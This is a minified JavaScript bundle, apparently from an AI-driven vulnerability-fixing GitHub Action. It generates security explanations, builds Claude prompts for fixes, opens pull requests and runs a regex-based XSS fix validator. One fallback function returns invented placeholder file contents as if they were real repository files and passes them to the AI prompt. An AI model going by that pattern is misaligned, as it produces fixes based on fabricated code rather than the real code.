coding practices"]}getAttackScenarios(X){return{sql_injection:["Data extraction through UNION-based attacks","Authentication bypass via boolean-based attacks"],xss:["Script injection to steal session cookies","Phishing attacks through content manipulation"],broken_access_control:["Privilege escalation to admin functions","Horizontal privilege escalation to other users' data"]}[X]||["Various attack vectors possible"]}getRelatedConcepts(X){return{sql_injection:["Input validation","Database security","Query parameterization"],xss:["Content Security Policy","Input sanitization","Output encoding"],broken_access_control:["Authentication","Authorization","Session management"]}[X]||["Security fundamentals"]}calculateRiskScore(X){let J=0;for(let Q of X)switch(Q.severity){case"critical":J+=25;break;case"high":J+=20;break;case"medium":J+=15;break;case"low":J+=10;break}return Math.min(100,J)}analyzeBusinessImpact(X){let J=X.some((Q)=>Q.severity==="critical"||Q.severity==="high");return{dataLoss:J?"High risk of sensitive data exposure or theft":"Moderate risk of data exposure",reputationalDamage:J?"Severe impact on customer trust and brand reputation":"Potential minor impact on reputation",financialImpact:J?"Significant costs from breaches, compliance fines, and recovery":"Minimal direct financial impact",operationalDisruption:J?"Potential system compromise affecting business operations":"Limited operational impact"}}analyzeComplianceImpact(X){let J=[];if(X.some((Q)=>Q.type==="sql_injection"||Q.type==="xss"))J.push("OWASP Top 10 compliance violation");if(X.some((Q)=>Q.type==="sensitive_data_exposure"))J.push("GDPR/CCPA data protection requirements at risk");return J.length>0?J:["Monitor compliance requirements"]}determinePriorities(X){let J=[];if(X.some((Q)=>Q.severity==="critical"))J.push("Immediate action required for critical vulnerabilities");if(X.some((Q)=>Q.severity==="high"))J.push("High priority fixes should be completed within 24-48 hours");return J.push("Implement comprehensive security testing"),J}estimateTimeline(X){let J=X.filter((Y)=>Y.severity==="critical").length,Q=X.filter((Y)=>Y.severity==="high").length;if(J>0)return"Immediate (within 24 hours)";if(Q>0)return"Urgent (within 48 hours)";return"Standard (within 1 week)"}generateBusinessLevelContent(X){let J=this.calculateRiskScore(X),Q=this.groupBySeverity(X);return`Your application has ${X.length} security vulnerabilities with a risk score of ${J}/100. 
    This includes ${Q.critical} critical, ${Q.high} high, ${Q.medium} medium, 
    and ${Q.low} low severity issues. These vulnerabilities pose significant risks to your business 
    operations, customer data, and regulatory compliance.`}extractCodeSnippet(X,J){for(let Q of Object.values(J)){let Y=Q.split(`
`);if(X.line<=Y.length)return Y[X.line-1]||"Code snippet not available"}return"Code snippet not available"}generateSummary(X){let J=this.groupBySeverity(X),Q=this.identifyPrimaryRisks(X),Y=this.estimateFixTime(X);return{totalVulnerabilities:X.length,severityBreakdown:J,primaryRisks:Q,estimatedFixTime:Y}}groupBySeverity(X){let J={critical:0,high:0,medium:0,low:0};for(let Q of X)J[Q.severity]++;return J}identifyPrimaryRisks(X){return[...new Set(X.map((Q)=>this.getVulnerabilityDisplayName(Q.type)))].slice(0,3)}estimateFixTime(X){let J=X.length*2;if(J<8)return`${J} hours`;return`${Math.ceil(J/8)} days`}getVulnerabilityDisplayName(X){return{sql_injection:"SQL Injection",xss:"Cross-Site Scripting (XSS)",broken_access_control:"Broken Access Control",sensitive_data_exposure:"Sensitive Data Exposure",xml_external_entities:"XML External Entities (XXE)",security_misconfiguration:"Security Misconfiguration",vulnerable_components:"Vulnerable Components",broken_authentication:"Broken Authentication",insecure_deserialization:"Insecure Deserialization",insufficient_logging:"Insufficient Logging"}[X]||X}formatLineLevelMarkdown(X){return`### ${X.title}

**Risk Level:** ${X.riskLevel}

${X.content}

**Vulnerable Code:**
\`\`\`javascript
${X.codeSnippet}
\`\`\`

**Secure Example:**
\`\`\`javascript
${X.secureExample}
\`\`\`

`}formatConceptLevelMarkdown(X){let J=`### ${X.title}

${X.content}

**Prevention Methods:**
`;for(let Q of X.preventionMethods)J+=`- ${Q}
`;J+=`
**Common Attack Scenarios:**
`;for(let Q of X.attackScenarios)J+=`- ${Q}
`;return J+`
`}formatBusinessLevelMarkdown(X){return`### ${X.title}

**Risk Score:** ${X.riskScore}/100

${X.content}

**Business Impact:**
- **Data Loss Risk:** ${X.businessImpact.dataLoss}
- **Reputational Damage:** ${X.businessImpact.reputationalDamage}  
- **Financial Impact:** ${X.businessImpact.financialImpact}
- **Operational Disruption:** ${X.businessImpact.operationalDisruption}

**Timeline:** ${X.timeline}

`}}var Gw=j1(()=>{IX()});async function R3(X,J,Q,Y,W,z){try{if(q.info(`Generating solution for issue #${X.number}`),Q.aiProvider.provider==="claude-code"&&!Y){q.info("Using Claude Code for solution generation");let F;if(Q.aiProvider.useVendedCredentials&&Q.rsolvApiKey){process.env.RSOLV_API_KEY=Q.rsolvApiKey,q.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:D}=await Promise.resolve().then(() => (dX(),W7));F=await D.getInstance(Q.rsolvApiKey)}let j={provider:Q.aiProvider.provider,apiKey:Q.aiProvider.apiKey,model:Q.aiProvider.model,temperature:Q.aiProvider.temperature,maxTokens:Q.aiProvider.maxTokens,useVendedCredentials:Q.aiProvider.useVendedCredentials,claudeCodeConfig:{}},O=new $6(j,process.cwd(),F),N={summary:`${J.issueType} issue requiring fixes`,complexity:J.estimatedComplexity==="simple"?"low":J.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[J.suggestedApproach],recommendedApproach:J.suggestedApproach,relatedFiles:J.filesToModify},A=await O.generateSolution(X,N);if(A.success)return{success:!0,message:"Solution generated with Claude Code",changes:A.changes};if(A.error&&A.error.includes("Claude Code CLI not available"))q.info("Claude Code not available, falling back to standard AI provider API");else return{success:!1,message:A.message,error:A.error}}let G=Q.aiProvider.provider==="claude-code"?{...Q.aiProvider,provider:"anthropic",model:"claude-3-5-sonnet-20241022"}:Q.aiProvider,H=Y||await QX(G),U=await ku1(X,J,W);if(Object.keys(U).length===0)return q.warn(`No files found for analysis in issue #${X.number}`),{success:!1,message:"No relevant files found for analysis"};let K=JN(J.issueType),V=`${eA(X,J,U)}

${K}`,B;if(z&&z.vulnerabilities&&z.vulnerabilities.length>0)q.info(`Including ${z.vulnerabilities.length} security vulnerabilities in solution prompt`),B=new O3().generateCompleteExplanation(z.vulnerabilities,U),q.info(`Generated three-tier explanations for ${B.lineLevelExplanations.length} vulnerabilities`),V+=`

## Security Analysis Results

The following security vulnerabilities were detected and MUST be addressed in your solution:

${z.vulnerabilities.map((j)=>`- **${j.severity} Severity**: ${j.type} in ${j.file}:${j.line}
   Pattern: ${j.pattern}
   Risk: ${j.risk}
   Recommendation: ${j.recommendation}`).join(`

`)}

Please ensure your solution addresses these security issues as a priority.`;q.info(`Calling AI with prompt length: ${V.length} chars`),q.info("Prompt preview (first 500 chars):",V.substring(0,500)),q.info("Prompt preview (last 500 chars):",V.substring(V.length-500));let Z=await H.complete(V,{temperature:0.2,maxTokens:4000,model:Q.aiProvider.model||"claude-3-sonnet-20240229"});q.info(`AI response length: ${Z.length} chars`),q.info("Raw AI solution response (first 1000 chars):",Z.substring(0,1000));let M=bu1(Z);if(q.debug(`Parsed ${Object.keys(M).length} file changes from response`),Object.keys(M).length===0)return q.warn(`No changes extracted from solution for issue #${X.number}`),{success:!1,message:"Failed to extract file changes from AI solution"};return{success:!0,message:"Solution generated successfully",changes:M,explanations:B}}catch(G){return q.error(`Error generating solution for issue #${X.number}`,G),{success:!1,message:`Error generating solution: ${G instanceof Error?G.message:String(G)}`,error:String(G)}}}async function ku1(X,J,Q){try{let Y=[...J.filesToModify||[]];if(Y.length===0){q.info("No files explicitly identified, inferring from issue content");let z=`${X.title} ${X.body}`,G=/\.([a-zA-Z0-9]+)\b/g,H=[],U;while((U=G.exec(z))!==null)if(!H.includes(U[1]))H.push(U[1]);q.debug(`Inferred file extensions: ${H.join(", ")}`)}q.info(`Fetching content for ${Y.length} files`);let W={};for(let z of Y)try{if(Q)W[z]=await Q(z);else W[z]=await vu1(z);q.debug(`Fetched content for ${z}`)}catch(G){q.warn(`Failed to fetch content for ${z}`,G)}return W}catch(Y){return q.error("Error getting files for analysis",Y),{}}}function bu1(X){let J={};try{let Q=/---\s*([\w./-]+)\s*---\s*```[\w]*\n?([\s\S]*?)```/gm,Y;while((Y=Q.exec(X))!==null){let[,W,z]=Y;if(W&&z)J[W]=z.trim()}if(Object.keys(J).length===0){let W=/```(\w+)\s+([\w./-]+)\n([\s\S]*?)```/gm;while((Y=W.exec(X))!==null){let[,,z,G]=Y;if(z&&G)J[z]=G.trim()}}if(Object.keys(J).length===0){let W=/([\w./-]+):\s*```[\w]*\n?([\s\S]*?)```/gm;while((Y=W.exec(X))!==null){let[,z,G]=Y;if(z&&G)J[z]=G.trim()}}if(Object.keys(J).length===0){let W=/```[\w]*\n?([\s\S]*?)```/gm,z=/([\w./-]+\.\w+)/;while((Y=W.exec(X))!==null){let G=Y[1],H=Math.max(0,Y.index-100),K=X.substring(H,Y.index).match(z);if(K&&G)J[K[1]]=G.trim()}}return J}catch(Q){return q.error("Error parsing solution response",Q),{}}}async function vu1(X){switch(await new Promise((Q)=>setTimeout(Q,100)),X.split(".").pop()?.toLowerCase()){case"js":return`// Example JavaScript file content for ${X}
function processData(input) {
  // TODO: Implement proper validation
  return input.map(item => item.value);
}

module.exports = { processData };
`;case"ts":return`// Example TypeScript file content for ${X}
interface DataItem {
  id: string;
  value: number;
}

function processData(input: DataItem[]): number[] {
  // TODO: Implement proper validation
  return input.map(item => item.value);
}

export { DataItem, processData };
`;case"py":return`# Example Python file content for ${X}
def process_data(input_data):
    # TODO: Implement proper validation
    return [item['value'] for item in input_data]

if __name__ == "__main__":
    print(process_data([{'value': 1}, {'value': 2}]))
`;case"md":return`# Documentation for ${X.split("/").pop()?.replace(".md","")}

## Overview

This documentation describes the usage and implementation details.

## Installation

\`\`\`bash
npm install example-package
\`\`\`

## Usage

\`\`\`javascript
const { processData } = require('example-package');
const result = processData([{ id: '1', value: 42 }]);
\`\`\`
`;default:return`// Example file content for ${X}
// This is a placeholder for demonstration purposes
`}}var zw=j1(()=>{t1();JQ();Gw();qQ()});async function Hw(X,J,Q,Y,W,z){try{q.info(`Creating pull request for issue #${X.number}`);let G=await xu1(X);await gu1(G,J,X);let H=await hu1(X,Q,J,Y,W,z),U=await yu1(X,G,H,Q,Y);return q.info(`Successfully created PR #${U.pullRequestNumber} for issue #${X.number}`),U}catch(G){return q.error(`Error creating pull request for issue #${X.number}`,G),{success:!1,message:`Error creating pull request: ${G instanceof Error?G.message:String(G)}`,error:String(G)}}}async function xu1(X){let J=X.title.toLowerCase().replace(/[^\w\s-]/g,"").trim().replace(/[\s]+/g,"-").substring(0,30),Q=`rsolv/${X.number}-${J}`;try{q.info(`Creating branch: ${Q}`);let Y=c0(),{owner:W,name:z}=X.repository;try{await Y.git.createRef({owner:W,repo:z,ref:`refs/heads/${Q}`,sha:await fu1(W,z,X.repository.defaultBranch)}),q.info(`Branch ${Q} created successfully`)}catch(G){if(G.status===422)q.warn(`Branch ${Q} already exists, using existing branch`);else throw G}return Q}catch(Y){throw q.error(`Error creating branch ${Q}`,Y),new Error(`Failed to create branch: ${Y instanceof Error?Y.message:String(Y)}`)}}async function fu1(X,J,Q){try{let Y=c0(),{data:W}=await Y.git.getRef({owner:X,repo:J,ref:`heads/${Q}`});return W.object.sha}catch(Y){throw q.error(`Error getting SHA for ${Q}`,Y),new Error(`Failed to get SHA for ${Q}: ${Y instanceof Error?Y.message:String(Y)}`)}}async function gu1(X,J,Q){try{q.info(`Applying ${Object.keys(J).length} file changes to branch ${X}`);let Y=c0(),{owner:W,name:z}=Q.repository,G=5,H=Object.keys(J);for(let U=0;U<H.length;U+=G){let K=H.slice(U,U+G);if(await Promise.all(K.map(async(V)=>{try{let B;try{let Z=await Y.repos.getContent({owner:W,repo:z,path:V,ref:X});if(!Array.isArray(Z.data))B=Z.data.sha}catch(Z){if(Z.status!==404)throw Z}await Y.repos.createOrUpdateFileContents({owner:W,repo:z,path:V,message:`Update ${V} for issue #${Q.number}`,content:Buffer.from(J[V]).toString("base64"),branch:X,sha:B}),q.debug(`Updated file: ${V}`)}catch(B){throw q.error(`Error updating file ${V}`,B),B}})),U+G<H.length)await new Promise((V)=>setTimeout(V,200))}q.info("All changes applied successfully")}catch(Y){throw q.error("Error applying changes to branch",Y),new Error(`Failed to apply changes: ${Y instanceof Error?Y.message:String(Y)}`)}}async function hu1(X,J,Q,Y,W,z){try{q.info(`Generating PR description for issue #${X.number}`);let G=await QX(Y.aiProvider),H=XN(X,J,Q),K=await G.complete(H,{temperature:0.3,maxTokens:1000,model:Y.aiProvider.model});if(W&&W.vulnerabilities&&W.vulnerabilities.length>0)K+=`

## \uD83D\uDD12 Security Fixes

This PR addresses the following security vulnerabilities:

`,W.vulnerabilities.forEach((V)=>{K+=`- **${V.severity}**: ${V.type} in \`${V.file}:${V.line}\`
`,K+=`  - Risk: ${V.risk}
`,K+=`  - Fixed by: ${V.recommendation}

`}),K+=`
### Security Impact
`,K+=`- **Vulnerabilities Fixed**: ${W.vulnerabilities.length}
`,K+=`- **Risk Level**: ${W.riskLevel||"Medium"}
`,K+=`- **Compliance**: OWASP Top 10 coverage
`;if(z){q.info("Including three-tier explanations in PR description"),K+=`

## \uD83D\uDCDA Educational Explanations

`;let V=z.businessLevelExplanation;if(K+=`### Executive Summary

`,K+=`**Risk Score**: ${V.riskScore}/100

`,K+=`${V.content}

`,K+=`**Key Business Impacts:**
`,K+=`- \uD83D\uDCB0 Financial: ${V.businessImpact.financialImpact}
`,K+=`- \uD83C\uDFE2 Reputation: ${V.businessImpact.reputationalDamage}
`,K+=`- \uD83D\uDCCA Operations: ${V.businessImpact.operationalDisruption}
`,K+=`- \uD83D\uDD12 Data: ${V.businessImpact.dataLoss}

`,V.priorities.length>0)K+=`**Recommended Actions:**
`,V.priorities.forEach((B)=>{K+=`- ${B}
`}),K+=`
`;if(K+=`<details>
<summary>View detailed technical explanations</summary>

`,z.conceptLevelExplanations.length>0)K+=`### Security Concepts

`,z.conceptLevelExplanations.forEach((B)=>{if(K+=`**${B.title}**
`,K+=`${B.content}

`,B.preventionMethods.length>0)K+=`Prevention methods:
`,B.preventionMethods.forEach((Z)=>{K+=`- ${Z}
`}),K+=`
`});K+=`</details>
`}return K+=`

This PR was automatically generated by [RSOLV](https://rsolv.dev) to address issue #${X.number}.`,K}catch(G){return q.error("Error generating PR description",G),`Fix for issue #${X.number}

This PR addresses the issue "${X.title}" by making changes to ${Object.keys(Q).length} files.

This PR was automatically generated by [RSOLV](https://rsolv.dev).`}}async function yu1(X,J,Q,Y,W){try{let z=`[RSOLV] ${X.title} (fixes #${X.number})`;q.info(`Creating PR: ${z}`);let G=c0(),{owner:H,name:U}=X.repository,{data:K}=await G.pulls.create({owner:H,repo:U,title:z,body:Q,head:J,base:X.repository.defaultBranch,draft:!1});return q.info(`Pull request created: ${K.html_url}`),await G.issues.addLabels({owner:H,repo:U,issue_number:K.number,labels:["rsolv:automated",`type:${Y.issueType}`]}),await G.issues.createComment({owner:H,repo:U,issue_number:X.number,body:`I've created a pull request to address this issue: ${K.html_url}

This was automatically generated by [RSOLV](https://rsolv.dev).`}),await mu1(X,K,z,W),{success:!0,message:"Pull request created successfully",pullRequestUrl:K.html_url,pullRequestNumber:K.number}}catch(z){throw q.error("Error creating GitHub PR",z),new Error(`Failed to create GitHub PR: ${z instanceof Error?z.message:String(z)}`)}}async function mu1(X,J,Q,Y){try{let W=process.env.RSOLV_API_URL||"https://api.rsolv.dev",z=process.env.RSOLV_API_KEY||Y.rsolvApiKey;if(!z){q.warn("RSOLV API key not configured, skipping fix attempt recording");return}let G=new P6({baseUrl:W,apiKey:z}),H={github_org:X.repository.owner,repo_name:X.repository.name,issue_number:X.number,pr_number:J.number,pr_title:Q,pr_url:J.html_url,issue_title:X.title,issue_url:`https://github.com/${X.repository.fullName}/issues/${X.number}`,api_key_used:z,metadata:{branch:J.head?.ref||`rsolv/${X.number}`,labels:["rsolv:automated"],created_by:"rsolv-action"}};q.info(`Recording fix attempt for PR #${J.number}`);let U=await G.recordFixAttempt(H);if(U.success)q.info(`Fix attempt recorded successfully: ID ${U.data?.id}`);else q.error(`Failed to record fix attempt: ${U.error}`)}catch(W){q.error("Error recording fix attempt",W)}}var Uw=j1(()=>{t1();i8();JQ()});import Kw from"fs";var A3;var Vw=j1(()=>{qQ();t1();A3=class A3 extends $6{contextCache=new Map;cacheTimeout=3600000;constructor(X,J=process.cwd(),Q){super(X,J,Q);if(X.claudeCodeConfig?.contextCacheDuration)this.cacheTimeout=X.claudeCodeConfig.contextCacheDuration}async gatherDeepContext(X,J){let Q=`${X.repository.fullName}-${J.contextDepth}`;if(this.contextCache.has(Q)){let W=this.contextCache.get(Q);return q.info("Using cached repository context"),W}q.info(`Starting deep context gathering with depth: ${J.contextDepth}`);let Y=Date.now();try{let W=this.buildContextGatheringPrompt(X,J),z={summary:"Analyzing issue for security vulnerabilities",complexity:"medium",estimatedTime:60,potentialFixes:[],recommendedApproach:"Generate solution using Claude Code SDK",relatedFiles:[]},G=await this.generateSolution(X,z,W),H=this.extractContextFromSolution(G);this.contextCache.set(Q,H);let U=Date.now()-Y;return q.info(`Deep context gathering completed in ${U}ms`),H}catch(W){return q.error("Error gathering deep context",W),this.createMinimalContext()}}async generateEnhancedSolution(X,J,Q){q.info("Generating enhanced solution with deep context");let Y=await this.gatherDeepContext(X,{enableUltraThink:!0,maxExplorationTime:this.config.claudeCodeConfig?.contextGatheringTimeout||300000,contextDepth:this.config.claudeCodeConfig?.contextDepth||"deep",includeArchitectureAnalysis:!0,includeTestPatterns:!0,includeStyleGuide:!0,includeDependencyAnalysis:!0}),W=this.buildEnhancedSolutionPrompt(X,J,Y,Q),z=await this.generateSolution(X,J,W);if(!z.success||!z.changes)throw new Error(z.error||"Failed to generate solution");return{title:`Fix ${X.title}`,description:`This PR fixes the security issue: ${X.body}

Generated using enhanced Claude Code SDK with deep context analysis.`,files:Object.entries(z.changes).map(([G,H])=>({path:G,changes:H}))}}buildContextGatheringPrompt(X,J){return`${J.enableUltraThink?`ultrathink

`:""}I need you to perform a comprehensive analysis of this repository to gather deep context for solving an issue.

Issue Context:
Title: ${X.title}
Description: ${X.body}

Repository: ${X.repository.fullName}
Language: ${X.repository.language||"Unknown"}

Exploration Depth: ${J.contextDepth}

Please analyze the repository and provide detailed information about:

1. Architecture and Design Patterns
   - Overall architecture style
   - Main design patterns used
   - Component organization
   - Module structure

2. Code Conventions and Style
   - Naming conventions for files, functions, variables
   - Import/export patterns
   - Comment and documentation style
   - Error handling patterns

3. Testing Framework and Patterns
   - Test framework(s) used
   - Test file organization
   - Test naming conventions
   - Mocking strategies

4. Dependencies and External Libraries
   - Runtime dependencies and their usage
   - Development dependencies
   - Build tools and configurations
   - External API integrations

5. Related Components
   - Files likely to be affected by this issue
   - Related modules and interfaces
   - Shared utilities or helpers
   - Configuration files

${J.includeStyleGuide?`6. Style Guide and Best Practices
   - Code formatting rules
   - Documentation requirements
   - Security practices
   - Performance considerations
`:""}

Explore the repository comprehensively, examining:
- Configuration files (package.json, tsconfig.json, etc.)
- README and documentation
- Build and CI/CD configurations
- Test suites and examples
- Similar implementations to the requested feature

Take your time to understand the codebase deeply. Look for patterns, conventions, and architectural decisions that should be followed when implementing the solution.

Format your response as a JSON object with the structure defined in the RepositoryContext interface.`}buildEnhancedSolutionPrompt(X,J,Q,Y){if(Y)return`ultrathink

${Y}

Additional Repository Context:
${JSON.stringify(Q,null,2)}

Use this deep understanding of the repository to ensure your solution:
- Follows all established patterns and conventions
- Integrates seamlessly with existing architecture
- Includes tests that match the project's testing style
- Handles errors consistently with the rest of the codebase`;return`ultrathink

Using the comprehensive repository context I've gathered, generate a solution for:

Issue: ${X.title}
Description: ${X.body}

Repository Context Summary:
- Architecture: ${Q.architecture.patterns.join(", ")}
- Main Components: ${Q.architecture.mainComponents.join(", ")}
- Testing Framework: ${Q.testingPatterns.framework}
- Code Style: ${Q.codeConventions.namingPatterns.join(", ")}
- Error Handling: ${Q.styleGuide.errorHandling}

Related Components that may need updates:
${Q.relatedComponents.files.join(`
`)}

Generate a solution that:
1. Follows the exact patterns found in: ${Q.codeConventions.fileOrganization}
2. Uses the same naming conventions as existing code
3. Includes comprehensive tests matching the style in the test directory
4. Handles errors using the pattern: ${Q.styleGuide.errorHandling}
5. Updates all related components identified above
6. Maintains architectural consistency with the ${Q.architecture.structure} structure
7. Uses appropriate dependencies from: ${Q.dependencies.runtime.join(", ")}

Take time to think through all implications and create a production-ready solution that feels native to this codebase.

Format your response as a JSON object with title, description, files, and tests.`}extractContextFromSolution(X){return this.createMinimalContext()}async parseContextResult(X){try{let J;if(X.includes(`
`)){let Q=X.split(`
`).filter((W)=>W.trim()),Y=Q[Q.length-1];J=JSON.parse(Y)}else J=JSON.parse(X);return{architecture:J.architecture||this.createMinimalContext().architecture,codeConventions:J.codeConventions||this.createMinimalContext().codeConventions,testingPatterns:J.testingPatterns||this.createMinimalContext().testingPatterns,dependencies:J.dependencies||this.createMinimalContext().dependencies,relatedComponents:J.relatedComponents||this.createMinimalContext().relatedComponents,styleGuide:J.styleGuide||this.createMinimalContext().styleGuide}}catch(J){return q.error("Error parsing context result",J),this.createMinimalContext()}}createMinimalContext(){return{architecture:{patterns:["Unknown"],structure:"Standard",mainComponents:[]},codeConventions:{namingPatterns:["camelCase"],fileOrganization:"Standard",importPatterns:[]},testingPatterns:{framework:"Unknown",structure:"Standard",conventions:[]},dependencies:{runtime:[],dev:[],patterns:[]},relatedComponents:{files:[],modules:[],interfaces:[]},styleGuide:{formatting:"Standard",documentation:"JSDoc",errorHandling:"try-catch"}}}cleanupTempFiles(X){for(let J of X)try{if(Kw.existsSync(J))Kw.unlinkSync(J)}catch(Q){q.warn(`Failed to clean up temp file: ${J}`,Q)}}clearContextCache(){this.contextCache.clear(),q.info("Context cache cleared")}getCacheStats(){return{size:this.contextCache.size,keys:Array.from(this.contextCache.keys())}}}});var N3;var Bw=j1(()=>{qQ();t1();N3=class N3 extends $6{async generateSolutionWithContext(X,J,Q,Y){q.info("Starting single-pass solution generation with integrated context");let W=this.constructSinglePassPrompt(X,J,Y);if(Q){let z=`${W}

## Additional Instructions:
${Q}`;return this.generateSolution(X,J,z)}return this.generateSolution(X,J,W)}constructSinglePassPrompt(X,J,Q){let Y=this.constructPrompt(X,J),W=`
## Single-Pass Processing Instructions

You need to both understand the codebase AND generate a solution in this single conversation.

### Phase 1: Quick Context Gathering (Limit to 5-10 tool calls)
1. Read the main files mentioned in the issue
2. Check the project structure and dependencies if needed
3. Look for related code patterns and conventions
4. Identify test frameworks and existing tests

### Phase 2: Solution Generation
Based on your understanding from Phase 1, immediately generate a solution.

**IMPORTANT**: 
- Do NOT spend excessive time exploring the codebase
- Focus on the specific issue and files mentioned
- Generate the solution as soon as you have enough context
- Aim to complete everything within 5-7 minutes total

### Expected Output Format
After your exploration, provide the solution in this exact JSON format:

\`\`\`json
{
  "summary": "Brief description of what you're fixing",
  "files": [
    {
      "path": "relative/path/to/file.js",
      "changes": "The complete updated file content"
    }
  ],
  "testingInstructions": [
    "How to verify the fix works"
  ],
  "breakingChanges": false,
  "additionalNotes": "Any important context"
}
\`\`\``,z="";if(Q)z=`
## Security Analysis Context
${JSON.stringify(Q,null,2)}

Make sure your fix addresses all security concerns identified above.`;return`${Y}
## Single-Pass Processing Instructions

You need to both understand the codebase AND generate a solution in this single conversation.

### Phase 1: Quick Context Gathering (Limit to 5-10 tool calls)
1. Read the main files mentioned in the issue
2. Check the project structure and dependencies if needed
3. Look for related code patterns and conventions
4. Identify test frameworks and existing tests

### Phase 2: Solution Generation
Based on your understanding from Phase 1, immediately generate a solution.

**IMPORTANT**: 
- Do NOT spend excessive time exploring the codebase
- Focus on the specific issue and files mentioned
- Generate the solution as soon as you have enough context
- Aim to complete everything within 5-7 minutes total

### Expected Output Format
After your exploration, provide the solution in this exact JSON format:

\`\`\`json
{
  "summary": "Brief description of what you're fixing",
  "files": [
    {
      "path": "relative/path/to/file.js",
      "changes": "The complete updated file content"
    }
  ],
  "testingInstructions": [
    "How to verify the fix works"
  ],
  "breakingChanges": false,
  "additionalNotes": "Any important context"
}
\`\`\`${z}`}}});import{execSync as L3}from"child_process";function D3(){try{try{L3("which claude",{stdio:"ignore"})}catch{return!1}let X=!1;try{let Y=L3("claude --version 2>&1",{encoding:"utf-8",timeout:5000}).toString().trim();q.debug(`Claude CLI version: ${Y}`),X=!0}catch(Y){return q.debug("Claude CLI version check failed:",Y.message),!1}let J=L3('echo "test" | claude --print 2>&1 || echo "FAILED"',{encoding:"utf-8",timeout:30000,shell:"/bin/sh"}).toString().trim(),Q=J.length>0&&!J.toLowerCase().includes("authenticate")&&!J.toLowerCase().includes("not found");return q.debug(`Claude Max check result: "${J.substring(0,50)}..." - Working: ${Q}`),Q}catch(X){return q.debug("Claude Code Max not available:",X.message),!1}}var w3;var I3=j1(()=>{CH();t1();w3=class w3 extends ZQ{useClaudeMax=!1;constructor(X,J=process.cwd(),Q){super(X,J,Q);if(this.isDevelopmentMode())if(this.useClaudeMax=D3(),this.useClaudeMax)q.info(" Claude Code Max detected and will be used for development");else q.info(" Development mode enabled but Claude Code Max not available/authenticated")}async generateSolution(X,J,Q){if(this.isDevelopmentMode()&&this.useClaudeMax){q.info("\uD83D\uDE80 Using Claude Code Max (signed-in account) for development");let W=Q||this.constructPrompt(X,J);if(q.info(`Working directory: ${this.repoPath}`),q.info(`Prompt length: ${W.length} characters`),!(await this.executeWithRetry(W,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:void 0,CLAUDE_CODE_MAX_API_KEY:void 0}})).success)return q.warn("Claude Code Max execution failed, falling back to API mode"),super.generateSolution(X,J,Q);let G=this.getModifiedFiles();if(G.length===0)return{success:!1,message:"No files were modified by Claude Code Max",error:"Claude Code Max did not make any file changes"};q.info(` Files modified by Claude Code Max: ${G.join(", ")}`);let H={};for(let U of G)H[U]="Modified by Claude Code Max";return{success:!0,message:`Successfully modified ${G.length} file(s) using Claude Code Max`,changes:H}}return super.generateSolution(X,J,Q)}async generateSolutionWithGit(X,J,Q,Y,W,z){return q.info("Claude Code Max: Using generateSolution (git operations handled by Claude)"),this.generateSolution(X,J,Q)}isDevelopmentMode(){return process.env.RSOLV_DEV_MODE==="true"||process.env.USE_CLAUDE_CODE_MAX==="true"}}});var Zw={};Y9(Zw,{getVulnerableFiles:()=>lu1});import*as t2 from"fs";import*as h7 from"path";async function lu1(X,J=10){let Q=new Map;try{let W=(await qw(X)).map((z)=>({path:z,score:du1(z)}));W.sort((z,G)=>G.score-z.score);for(let{path:z}of W.slice(0,J))try{let G=h7.relative(X,z),H=t2.readFileSync(z,"utf8");Q.set(G,H),q.debug(`Added vulnerable file candidate: ${G}`)}catch(G){q.debug(`Could not read file ${z}:`,G)}}catch(Y){q.warn("Error scanning for vulnerable files:",Y)}return Q}async function qw(X,J=[],Q=0){if(Q>3)return J;try{let Y=t2.readdirSync(X,{withFileTypes:!0});for(let W of Y){let z=h7.join(X,W.name);if(W.isDirectory()){if(["node_modules",".git","dist","build","vendor","coverage"].includes(W.name))continue;await qw(z,J,Q+1)}else if(W.isFile()){let G=h7.extname(W.name).toLowerCase();if(Object.values(cu1).flat().includes(G)&&pu1(W.name))J.push(z)}}}catch(Y){}return J}function pu1(X){let J=X.toLowerCase();return uu1.some((Q)=>J.includes(Q))}function du1(X){let J=0,Q=X.toLowerCase();if(Q.includes("auth"))J+=10;if(Q.includes("login"))J+=10;if(Q.includes("password"))J+=8;if(Q.includes("token"))J+=8;if(Q.includes("sql")||Q.includes("query"))J+=7;if(Q.includes("upload"))J+=7;if(Q.includes("controller")||Q.includes("handler"))J+=5;if(Q.includes("route"))J+=4;if(Q.includes("api"))J+=4;if(Q.includes("config"))J+=3;if(Q.includes("test")||Q.includes("spec"))J-=5;return J}var uu1,cu1;var Mw=j1(()=>{t1();uu1=["auth","login","session","password","token","crypto","database","query","sql","db","route","controller","handler","api","endpoint","form","input","upload","search","config","settings","env"],cu1={javascript:[".js",".jsx"],typescript:[".ts",".tsx"],python:[".py"],ruby:[".rb"],php:[".php"],java:[".java"],elixir:[".ex",".exs"]}});var C3={};Y9(C3,{shouldUseStaticValidation:()=>ru1,StaticXSSValidator:()=>Fw});import{execSync as iu1}from"child_process";class Fw{validateXSSFix(X,J,Q){try{let Y=this.getFileAtCommit(X,J),W=this.getFileAtCommit(X,Q),z=this.findVulnerablePatterns(W),G=this.findSafePatterns(W),H=this.validateFix(Y,W);return{isValidFix:H,vulnerablePatterns:z,safePatterns:G,error:H?void 0:"Vulnerable patterns still present or safe patterns not found"}}catch(Y){return q.error("Static validation failed",Y),{isValidFix:!1,vulnerablePatterns:[],safePatterns:[],error:Y.message}}}getFileAtCommit(X,J){try{return iu1(`git show ${J}:${X}`,{encoding:"utf-8",stdio:"pipe"})}catch(Q){throw q.error(`Failed to get file ${X} at commit ${J}`,Q),Q}}findVulnerablePatterns(X){let J=[];if(/document\.write\s*\([^)]*\+[^)]*\)/.test(X))J.push("document.write with concatenation");if(/innerHTML\s*=\s*[^;]*\+/.test(X))J.push("innerHTML with concatenation");if(/eval\s*\([^)]*location\.|eval\s*\([^)]*window\./.test(X))J.push("eval with potential user input");if(/\$\{[^}]*location\.[^}]*\}/.test(X)&&/innerHTML|document\.write/.test(X))J.push("template literal with location in unsafe context");if(/document\.write.*location\.host/.test(X))J.push("document.write with location.host");return J}findSafePatterns(X){let J=[];if(/document\.createElement\s*\(\s*['"]script['"]\s*\)/.test(X))J.push("createElement for script tags");if(/appendChild\s*\(/.test(X))J.push("appendChild for DOM manipulation");if(/textContent\s*=/.test(X))J.push("textContent for safe text insertion");if(/allowedHosts|whitelist|includes\s*\(/.test(X))J.push("whitelist 